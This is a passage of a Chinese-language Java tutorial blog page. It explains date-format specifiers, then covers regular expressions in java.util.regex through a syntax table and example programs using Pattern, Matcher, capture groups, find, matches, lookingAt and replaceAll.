class="comment">//b的使用，月份简称  </span></span><br><span class="line">        String str=String.format(Locale.US,<span class="string">&quot;英文月份简称：%tb&quot;</span>,date);       </span><br><span class="line">        System.out.println(str);                                                                              </span><br><span class="line">        System.out.printf(<span class="string">&quot;本地月份简称：%tb%n&quot;</span>,date);  </span><br><span class="line">        <span class="comment">//B的使用，月份全称  </span></span><br><span class="line">        str=String.format(Locale.US,<span class="string">&quot;英文月份全称：%tB&quot;</span>,date);  </span><br><span class="line">        System.out.println(str);  </span><br><span class="line">        System.out.printf(<span class="string">&quot;本地月份全称：%tB%n&quot;</span>,date);  </span><br><span class="line">        <span class="comment">//a的使用，星期简称  </span></span><br><span class="line">        str=String.format(Locale.US,<span class="string">&quot;英文星期的简称：%ta&quot;</span>,date);  </span><br><span class="line">        System.out.println(str);  </span><br><span class="line">        <span class="comment">//A的使用，星期全称  </span></span><br><span class="line">        System.out.printf(<span class="string">&quot;本地星期的简称：%tA%n&quot;</span>,date);  </span><br><span class="line">        <span class="comment">//C的使用，年前两位  </span></span><br><span class="line">        System.out.printf(<span class="string">&quot;年的前两位数字（不足两位前面补0）：%tC%n&quot;</span>,date);  </span><br><span class="line">        <span class="comment">//y的使用，年后两位  </span></span><br><span class="line">        System.out.printf(<span class="string">&quot;年的后两位数字（不足两位前面补0）：%ty%n&quot;</span>,date);  </span><br><span class="line">        <span class="comment">//j的使用，一年的天数  </span></span><br><span class="line">        System.out.printf(<span class="string">&quot;一年中的天数（即年的第几天）：%tj%n&quot;</span>,date);  </span><br><span class="line">        <span class="comment">//m的使用，月份  </span></span><br><span class="line">        System.out.printf(<span class="string">&quot;两位数字的月份（不足两位前面补0）：%tm%n&quot;</span>,date);  </span><br><span class="line">        <span class="comment">//d的使用，日（二位，不够补零）  </span></span><br><span class="line">        System.out.printf(<span class="string">&quot;两位数字的日（不足两位前面补0）：%td%n&quot;</span>,date);  </span><br><span class="line">        <span class="comment">//e的使用，日（一位不补零）  </span></span><br><span class="line">        System.out.printf(<span class="string">&quot;月份的日（前面不补0）：%te&quot;</span>,date);  </span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230511233142.png"></p><p>编译运行结果为：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230511233239.png"></p><h2 id="解析字符串为时间"><a href="#解析字符串为时间" class="headerlink" title="解析字符串为时间"></a>解析字符串为时间</h2><h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><p>正则表达式定义了字符串的模式。</p><p>正则表达式可以用来搜索、编辑或处理文本。</p><p>正则表达式并不仅限于某一种语言，但是在每种语言中有细微的差别。</p><h2 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h2><p>一个字符串其实就是一个简单的正则表达式，例如 <strong>Hello World</strong> 正则表达式匹配 “Hello World” 字符串。</p><p><code>.</code>（点号）也是一个正则表达式，它匹配任何一个字符如：”a” 或 “1”。</p><p>下表列出了一些正则表达式的实例及描述：</p><table><thead><tr><th align="left">正则表达式</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">this is text</td><td align="left">匹配字符串 “this is text”</td></tr><tr><td align="left">this\s+is\s+text</td><td align="left">注意字符串中的 <strong>\s+</strong>                                                                                                                                                                                              匹配单词 “this” 后面的 <strong>\s+</strong> 可以匹配多个空格，之后匹配 is 字符串，再之后 <strong>\s+</strong> 匹配多个空格然后再跟上 text 字符串。                                                                                                                                                                                              可以匹配这个实例：this is text</td></tr><tr><td align="left">^\d+(.\d+)?</td><td align="left">^ 定义了以什么开始                                                                                                                                                        \d+ 匹配一个或多个数字                                                                                                                                                           ? 设置括号内的选项是可选的                                                                                                                                                        . 匹配 “.”                                                                                                                                                                                              可以匹配的实例：”5”, “1.5” 和 “2.21”。</td></tr></tbody></table><p>java.util.regex 包主要包括以下三个类：</p><ul><li><p>Pattern 类：</p><p>pattern 对象是一个正则表达式的编译表示。Pattern 类没有公共构造方法。要创建一个 Pattern 对象，你必须首先调用其公共静态编译方法，它返回一个 Pattern 对象。该方法接受一个正则表达式作为它的第一个参数。</p></li><li><p>Matcher 类：</p><p>Matcher 对象是对输入字符串进行解释和匹配操作的引擎。与Pattern 类一样，Matcher 也没有公共构造方法。你需要调用 Pattern 对象的 matcher 方法来获得一个 Matcher 对象。</p></li><li><p>PatternSyntaxException：</p><p>PatternSyntaxException 是一个非强制异常类，它表示一个正则表达式模式中的语法错误。</p></li></ul><p><strong>实例：</strong></p><p>以下实例中使用了正则表达式 <strong>.*blog.*</strong> 用于查找字符串中是否包了 <strong>blog</strong> 子串：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.regex.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        String content = <span class="string">&quot;This is my blog&quot;</span> + <span class="string">&quot;S1gma&#x27;s blog&quot;</span>;</span><br><span class="line">        String pattern = <span class="string">&quot;.*blog.*&quot;</span>;</span><br><span class="line">        <span class="keyword">boolean</span> isMatch = Pattern.matches(pattern,content);</span><br><span class="line">        System.out.println(<span class="string">&quot;字符串中是否包含了 &#x27;blog&#x27; 子字符串?&quot;</span> + <span class="string">&quot;\n&quot;</span> + isMatch);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230511235612.png"></p><p>编译运行结果为：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230511235707.png"></p><h2 id="正则表达式语法"><a href="#正则表达式语法" class="headerlink" title="正则表达式语法"></a>正则表达式语法</h2><p>在其他语言中，<code>\\</code> 表示：我想要在正则表达式中插入一个普通的（字面上的）反斜杠，请不要给它任何特殊的意义。</p><p>在 Java 中，<code>\\</code> 表示：我要插入一个正则表达式的反斜线，所以<strong>其后的字符具有特殊的意义</strong>。</p><p>所以，在其他的语言中（如 Perl），一个反斜杠<code> \</code> 就足以具有转义的作用，而在 Java 中正则表达式中则需要有两个反斜杠才能被解析为其他语言中的转义作用。也可以简单的理解*在 Java 的正则表达式中，两个<code> \\</code> 代表其他语言中的一个<code> \</code>，这也就是为什么表示一位数字的正则表达式是<code> \\d</code>，而表示一个普通的反斜杠是<code> \\</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">System.out.print(<span class="string">&quot;\\&quot;</span>);    <span class="comment">// 输出为 \</span></span><br><span class="line">System.out.print(<span class="string">&quot;\\\\&quot;</span>);  <span class="comment">// 输出为 \\</span></span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">字符</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">\</td><td align="left">将下一字符标记为特殊字符、文本、反向引用或八进制转义符。例如， <strong>n</strong>匹配字符 <strong>n</strong>。<strong>\n</strong> 匹配换行符。序列 <strong>\\** 匹配 *<em>\*</em> ，</strong>\(** 匹配 **(**。</td></tr><tr><td align="left">^</td><td align="left">匹配输入字符串开始的位置。如果设置了 <strong>RegExp</strong> 对象的 <strong>Multiline</strong> 属性，^ 还会与”\n”或”\r”之后的位置匹配。</td></tr><tr><td align="left">$</td><td align="left">匹配输入字符串结尾的位置。如果设置了 <strong>RegExp</strong> 对象的 <strong>Multiline</strong> 属性，$ 还会与”\n”或”\r”之前的位置匹配。</td></tr><tr><td align="left">*</td><td align="left">零次或多次匹配前面的字符或子表达式。例如，zo* 匹配”z”和”zoo”。* 等效于 {0,}。</td></tr><tr><td align="left">+</td><td align="left">一次或多次匹配前面的字符或子表达式。例如，”zo+”与”zo”和”zoo”匹配，但与”z”不匹配。+ 等效于 {1,}。</td></tr><tr><td align="left">?</td><td align="left">零次或一次匹配前面的字符或子表达式。例如，”do(es)?”匹配”do”或”does”中的”do”。? 等效于 {0,1}。</td></tr><tr><td align="left">{<em>n</em>}</td><td align="left"><em>n</em> 是非负整数。正好匹配 <em>n</em> 次。例如，”o{2}”与”Bob”中的”o”不匹配，但与”food”中的两个”o”匹配。</td></tr><tr><td align="left">{<em>n</em>,}</td><td align="left"><em>n</em> 是非负整数。至少匹配 <em>n</em> 次。例如，”o{2,}”不匹配”Bob”中的”o”，而匹配”foooood”中的所有 o。”o{1,}”等效于”o+”。”o{0,}”等效于”o*”。</td></tr><tr><td align="left">{<em>n</em>,<em>m</em>}</td><td align="left"><em>m</em> 和 <em>n</em> 是非负整数，其中 <em>n</em> &lt;= <em>m</em>。匹配至少 <em>n</em> 次，至多 <em>m</em> 次。例如，”o{1,3}”匹配”fooooood”中的头三个 o。’o{0,1}’ 等效于 ‘o?’。注意：您不能将空格插入逗号和数字之间。</td></tr><tr><td align="left">?</td><td align="left">当此字符紧随任何其他限定符（*、+、?、{<em>n</em>}、{<em>n</em>,}、{<em>n</em>,<em>m</em>}）之后时，匹配模式是”非贪心的”。”非贪心的”模式匹配搜索到的、尽可能短的字符串，而默认的”贪心的”模式匹配搜索到的、尽可能长的字符串。例如，在字符串”oooo”中，”o+?”只匹配单个”o”，而”o+”匹配所有”o”。</td></tr><tr><td align="left">.</td><td align="left">匹配除”\r\n”之外的任何单个字符。若要匹配包括”\r\n”在内的任意字符，请使用诸如”[\s\S]”之类的模式。</td></tr><tr><td align="left">(<em>pattern</em>)</td><td align="left">匹配 <em>pattern</em> 并捕获该匹配的子表达式。可以使用 <strong>$0…$9</strong> 属性从结果”匹配”集合中检索捕获的匹配。若要匹配括号字符 ( )，请使用”(“或者”)“。</td></tr><tr><td align="left">(?:<em>pattern</em>)</td><td align="left">匹配 <em>pattern</em> 但不捕获该匹配的子表达式，即它是一个非捕获匹配，不存储供以后使用的匹配。这对于用”or”字符 (|) 组合模式部件的情况很有用。例如，’industr(?:y|ies) 是比 ‘industry|industries’ 更经济的表达式。</td></tr><tr><td align="left">(?=<em>pattern</em>)</td><td align="left">执行正向预测先行搜索的子表达式，该表达式匹配处于匹配 <em>pattern</em> 的字符串的起始点的字符串。它是一个非捕获匹配，即不能捕获供以后使用的匹配。例如，’Windows (?=95|98|NT|2000)’ 匹配”Windows 2000”中的”Windows”，但不匹配”Windows 3.1”中的”Windows”。预测先行不占用字符，即发生匹配后，下一匹配的搜索紧随上一匹配之后，而不是在组成预测先行的字符后。</td></tr><tr><td align="left">(?!<em>pattern</em>)</td><td align="left">执行反向预测先行搜索的子表达式，该表达式匹配不处于匹配 <em>pattern</em> 的字符串的起始点的搜索字符串。它是一个非捕获匹配，即不能捕获供以后使用的匹配。例如，’Windows (?!95|98|NT|2000)’ 匹配”Windows 3.1”中的 “Windows”，但不匹配”Windows 2000”中的”Windows”。预测先行不占用字符，即发生匹配后，下一匹配的搜索紧随上一匹配之后，而不是在组成预测先行的字符后。</td></tr><tr><td align="left"><em>x</em>|<em>y</em></td><td align="left">匹配 <em>x</em> 或 <em>y</em>。例如，’z|food’ 匹配”z”或”food”。’(z|f)ood’ 匹配”zood”或”food”。</td></tr><tr><td align="left">[<em>xyz</em>]</td><td align="left">字符集。匹配包含的任一字符。例如，”[abc]”匹配”plain”中的”a”。</td></tr><tr><td align="left">[^<em>xyz</em>]</td><td align="left">反向字符集。匹配未包含的任何字符。例如，”[^abc]”匹配”plain”中”p”，”l”，”i”，”n”。</td></tr><tr><td align="left">[<em>a-z</em>]</td><td align="left">字符范围。匹配指定范围内的任何字符。例如，”[a-z]”匹配”a”到”z”范围内的任何小写字母。</td></tr><tr><td align="left">[^<em>a-z</em>]</td><td align="left">反向范围字符。匹配不在指定的范围内的任何字符。例如，”[^a-z]”匹配任何不在”a”到”z”范围内的任何字符。</td></tr><tr><td align="left">\b</td><td align="left">匹配一个字边界，即字与空格间的位置。例如，”er\b”匹配”never”中的”er”，但不匹配”verb”中的”er”。</td></tr><tr><td align="left">\B</td><td align="left">非字边界匹配。”er\B”匹配”verb”中的”er”，但不匹配”never”中的”er”。</td></tr><tr><td align="left">\c<em>x</em></td><td align="left">匹配 <em>x</em> 指示的控制字符。例如，\cM 匹配 Control-M 或回车符。<em>x</em> 的值必须在 A-Z 或 a-z 之间。如果不是这样，则假定 c 就是”c”字符本身。</td></tr><tr><td align="left">\d</td><td align="left">数字字符匹配。等效于 [0-9]。</td></tr><tr><td align="left">\D</td><td align="left">非数字字符匹配。等效于 [^0-9]。</td></tr><tr><td align="left">\f</td><td align="left">换页符匹配。等效于 \x0c 和 \cL。</td></tr><tr><td align="left">\n</td><td align="left">换行符匹配。等效于 \x0a 和 \cJ。</td></tr><tr><td align="left">\r</td><td align="left">匹配一个回车符。等效于 \x0d 和 \cM。</td></tr><tr><td align="left">\s</td><td align="left">匹配任何空白字符，包括空格、制表符、换页符等。与 [ \f\n\r\t\v] 等效。</td></tr><tr><td align="left">\S</td><td align="left">匹配任何非空白字符。与 [^ \f\n\r\t\v] 等效。</td></tr><tr><td align="left">\t</td><td align="left">制表符匹配。与 \x09 和 \cI 等效。</td></tr><tr><td align="left">\v</td><td align="left">垂直制表符匹配。与 \x0b 和 \cK 等效。</td></tr><tr><td align="left">\w</td><td align="left">匹配任何字类字符，包括下划线。与”[A-Za-z0-9_]”等效。</td></tr><tr><td align="left">\W</td><td align="left">与任何非单词字符匹配。与”[^A-Za-z0-9_]”等效。</td></tr><tr><td align="left">\x<em>n</em></td><td align="left">匹配 <em>n</em>，此处的 <em>n</em> 是一个十六进制转义码。十六进制转义码必须正好是两位数长。例如，”\x41”匹配”A”。”\x041”与”\x04”&amp;”1”等效。允许在正则表达式中使用 ASCII 代码。</td></tr><tr><td align="left">*num*</td><td align="left">匹配 <em>num</em>，此处的 <em>num</em> 是一个正整数。到捕获匹配的反向引用。例如，”(.)\1”匹配两个连续的相同字符。</td></tr><tr><td align="left">*n*</td><td align="left">标识一个八进制转义码或反向引用。如果 *n* 前面至少有 <em>n</em> 个捕获子表达式，那么 <em>n</em> 是反向引用。否则，如果 <em>n</em> 是八进制数 (0-7)，那么 <em>n</em> 是八进制转义码。</td></tr><tr><td align="left">*nm*</td><td align="left">标识一个八进制转义码或反向引用。如果 *nm* 前面至少有 <em>nm</em> 个捕获子表达式，那么 <em>nm</em> 是反向引用。如果 *nm* 前面至少有 <em>n</em> 个捕获，则 <em>n</em> 是反向引用，后面跟有字符 <em>m</em>。如果两种前面的情况都不存在，则 *nm* 匹配八进制值 <em>nm</em>，其中 <em>n</em> 和 <em>m</em> 是八进制数字 (0-7)。</td></tr><tr><td align="left">\nml</td><td align="left">当 <em>n</em> 是八进制数 (0-3)，<em>m</em> 和 <em>l</em> 是八进制数 (0-7) 时，匹配八进制转义码 <em>nml</em>。</td></tr><tr><td align="left">\u<em>n</em></td><td align="left">匹配 <em>n</em>，其中 <em>n</em> 是以四位十六进制数表示的 Unicode 字符。例如，\u00A9 匹配版权符号 (©)。</td></tr></tbody></table><p><em>根据 Java Language Specification 的要求，Java 源代码的字符串中的反斜线被解释为 Unicode 转义或其他字符转义。因此必须在字符串字面值中使用两个反斜线，表示正则表达式受到保护，不被 Java 字节码编译器解释。例如，当解释为正则表达式时，字符串字面值 “\b” 与单个退格字符匹配，而 “\b” 与单词边界匹配。字符串字面值 “(hello)“ 是非法的，将导致编译时错误；要与字符串 (hello) 匹配，必须使用字符串字面值 “\(hello\)”。</em></p><h2 id="捕获组"><a href="#捕获组" class="headerlink" title="捕获组"></a>捕获组</h2><p><strong>捕获组是把多个字符当一个单独单元进行处理的方法，它通过对括号内的字符分组来创建。</strong></p><p>例如，正则表达式 (dog) 创建了单一分组，组里包含”d”，”o”，和”g”。</p><p>捕获组是通过从左至右计算其开括号来编号。例如，在表达式（（A）（B（C））），有四个这样的组：</p><ul><li>((A)(B(C)))</li><li>(A)</li><li>(B(C))</li><li>(C)</li></ul><p>可以通过调用 matcher 对象的 groupCount 方法来查看表达式有多少个分组。groupCount 方法返回一个 int 值，表示matcher对象当前有多个捕获组。</p><p>还有一个特殊的组（group(0)），它总是代表整个表达式。该组不包括在 groupCount 的返回值中。</p><p><strong>实例</strong></p><p>下面的例子说明如何从一个给定的字符串中找到数字串：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.regex.Matcher;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RegexMatches</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">( String[] args )</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">      <span class="comment">// 按指定模式在字符串查找</span></span><br><span class="line">      String line = <span class="string">&quot;This order was placed for QT3000! OK?&quot;</span>;</span><br><span class="line">      String pattern = <span class="string">&quot;(\\D*)(\\d+)(.*)&quot;</span>;</span><br><span class="line"> </span><br><span class="line">      <span class="comment">// 创建 Pattern 对象</span></span><br><span class="line">      Pattern r = Pattern.compile(pattern);</span><br><span class="line"> </span><br><span class="line">      <span class="comment">// 现在创建 matcher 对象</span></span><br><span class="line">      Matcher m = r.matcher(line);</span><br><span class="line">      <span class="keyword">if</span> (m.find( )) &#123;</span><br><span class="line">         System.out.println(<span class="string">&quot;Found value: &quot;</span> + m.group(<span class="number">0</span>) );</span><br><span class="line">         System.out.println(<span class="string">&quot;Found value: &quot;</span> + m.group(<span class="number">1</span>) );</span><br><span class="line">         System.out.println(<span class="string">&quot;Found value: &quot;</span> + m.group(<span class="number">2</span>) );</span><br><span class="line">         System.out.println(<span class="string">&quot;Found value: &quot;</span> + m.group(<span class="number">3</span>) ); </span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         System.out.println(<span class="string">&quot;NO MATCH&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230512000908.png"></p><p>编译运行结果为：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230512000959.png"></p><h2 id="Matcher-类的方法"><a href="#Matcher-类的方法" class="headerlink" title="Matcher 类的方法"></a>Matcher 类的方法</h2><h3 id="查找方法"><a href="#查找方法" class="headerlink" title="查找方法"></a>查找方法</h3><p>查找方法用来检查输入字符串并返回一个布尔值，表示是否找到该模式：</p><table><thead><tr><th align="left"><strong>序号</strong></th><th align="left"><strong>方法及说明</strong></th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><strong>public boolean lookingAt()</strong>  尝试将从区域开头开始的输入序列与该模式匹配。</td></tr><tr><td align="left">2</td><td align="left"><strong>public boolean find()</strong> 尝试查找与该模式匹配的输入序列的下一个子序列。</td></tr><tr><td align="left">3</td><td align="left"><strong>public boolean find(int start****）</strong> 重置此匹配器，然后尝试查找匹配该模式、从指定索引开始的输入序列的下一个子序列。</td></tr><tr><td align="left">4</td><td align="left"><strong>public boolean matches()</strong> 尝试将整个区域与模式匹配。</td></tr></tbody></table><h3 id="替换方法"><a href="#替换方法" class="headerlink" title="替换方法"></a>替换方法</h3><p>替换方法是替换输入字符串里文本的方法：</p><table><thead><tr><th align="left"><strong>序号</strong></th><th align="left"><strong>方法及说明</strong></th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><strong>public Matcher appendReplacement(StringBuffer sb, String replacement)</strong> 实现非终端添加和替换步骤。</td></tr><tr><td align="left">2</td><td align="left"><strong>public StringBuffer appendTail(StringBuffer sb)</strong> 实现终端添加和替换步骤。</td></tr><tr><td align="left">3</td><td align="left"><strong>public String replaceAll(String replacement)</strong>  替换模式与给定替换字符串相匹配的输入序列的每个子序列。</td></tr><tr><td align="left">4</td><td align="left"><strong>public String replaceFirst(String replacement)</strong>  替换模式与给定替换字符串匹配的输入序列的第一个子序列。</td></tr><tr><td align="left">5</td><td align="left"><strong>public static String quoteReplacement(String s)</strong> 返回指定字符串的字面替换字符串。这个方法返回一个字符串，就像传递给Matcher类的appendReplacement 方法一个字面字符串一样工作。</td></tr></tbody></table><h2 id="start-和-end-方法"><a href="#start-和-end-方法" class="headerlink" title="start 和 end 方法"></a>start 和 end 方法</h2><p>下面是一个对单词 “cat” 出现在输入字符串中出现次数进行计数的例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.regex.Matcher;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RegexMatches</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String REGEX = <span class="string">&quot;\\bcat\\b&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String INPUT = <span class="string">&quot;cat cat cat cattie cat&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">( String[] args )</span></span>&#123;</span><br><span class="line">       Pattern p = Pattern.compile(REGEX);</span><br><span class="line">       Matcher m = p.matcher(INPUT); <span class="comment">// 获取 matcher 对象</span></span><br><span class="line">       <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">       <span class="keyword">while</span>(m.find()) &#123;</span><br><span class="line">         count++;</span><br><span class="line">         System.out.println(<span class="string">&quot;Match number &quot;</span>+ count);</span><br><span class="line">         System.out.println(<span class="string">&quot;start(): &quot;</span>+ m.start());</span><br><span class="line">         System.out.println(<span class="string">&quot;end(): &quot;</span>+ m.end());</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230512002415.png"></p><p>实例编译运行结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230512002525.png"></p><p>可以看到这个例子是使用单词边界，以确保字母 “c” “a” “t” 并非仅是一个较长的词的子串。它也提供了一些关于输入字符串中匹配发生位置的有用信息。</p><p>Start 方法返回在以前的匹配操作期间，由给定组所捕获的子序列的初始索引，end 方法最后一个匹配字符的索引加 1。</p><h2 id="matches-和-lookingAt-方法"><a href="#matches-和-lookingAt-方法" class="headerlink" title="matches 和 lookingAt 方法"></a>matches 和 lookingAt 方法</h2><p>matches 和 lookingAt 方法都用来尝试匹配一个输入序列模式。它们的不同是 <strong>matches 要求整个序列都匹配</strong>，而lookingAt 不要求。</p><p><strong>lookingAt 方法虽然不需要整句都匹配，但是需要从第一个字符开始匹配。</strong></p><p>这两个方法经常在输入字符串的开始使用。</p><p>我们通过下面这个例子，来解释这个功能：</p><p><strong>实例：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.regex.Matcher;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RegexMatches</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String REGEX = <span class="string">&quot;foo&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String INPUT = <span class="string">&quot;fooooooooooooooooo&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String INPUT2 = <span class="string">&quot;ooooofoooooooooooo&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Pattern pattern;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Matcher matcher;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Matcher matcher2;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        pattern = Pattern.compile(REGEX);</span><br><span class="line">        matcher = pattern.matcher(INPUT);</span><br><span class="line">        matcher2 = pattern.matcher(INPUT2);</span><br><span class="line">  </span><br><span class="line">        System.out.println(<span class="string">&quot;Current REGEX is: &quot;</span>+REGEX);</span><br><span class="line">        System.out.println(<span class="string">&quot;Current INPUT is: &quot;</span>+INPUT);</span><br><span class="line">        System.out.println(<span class="string">&quot;Current INPUT2 is: &quot;</span>+INPUT2);</span><br><span class="line">  </span><br><span class="line">        System.out.println(<span class="string">&quot;lookingAt(): &quot;</span>+matcher.lookingAt());</span><br><span class="line">        System.out.println(<span class="string">&quot;matches(): &quot;</span>+matcher.matches());</span><br><span class="line">        System.out.println(<span class="string">&quot;lookingAt(): &quot;</span>+matcher2.lookingAt());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230513114448.png"></p><p>编译运行结果：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230513114555.png"></p><h2 id="replaceFirst-和-replaceAll-方法"><a href="#replaceFirst-和-replaceAll-方法" class="headerlink" title="replaceFirst 和 replaceAll 方法"></a>replaceFirst 和 replaceAll 方法</h2><p>replaceFirst 和 replaceAll 方法用来<strong>替换匹配正则表达式的文本</strong>。不同的是，<strong>replaceFirst 替换首次匹配，replaceAll 替换所有匹配</strong>。</p><p><strong>实例：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.regex.Matcher;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RegexMatches</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String REGEX = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String INPUT = <span class="string">&quot;The dog says meow. &quot;</span> + <span class="string">&quot;All dogs say meow.&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String REPLACE = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">       Pattern p = Pattern.compile(REGEX);</span><br><span class="line">       <span class="comment">// get a matcher object</span></span><br><span class="line">       Matcher m = p.matcher(INPUT); </span><br><span class="line">       INPUT = m.replaceAll(REPLACE);</span><br><span class="line">       System.out.println(INPUT);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230513115240.png"></p><p>编译运行结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230513115315.png"></p><h2 id="appendReplacement-和-appendTail-方法"><a href="#appendReplacement-和-appendTail-方法" class="headerlink" title="appendReplacement 和 appendTail 方法"></a>appendReplacement 和 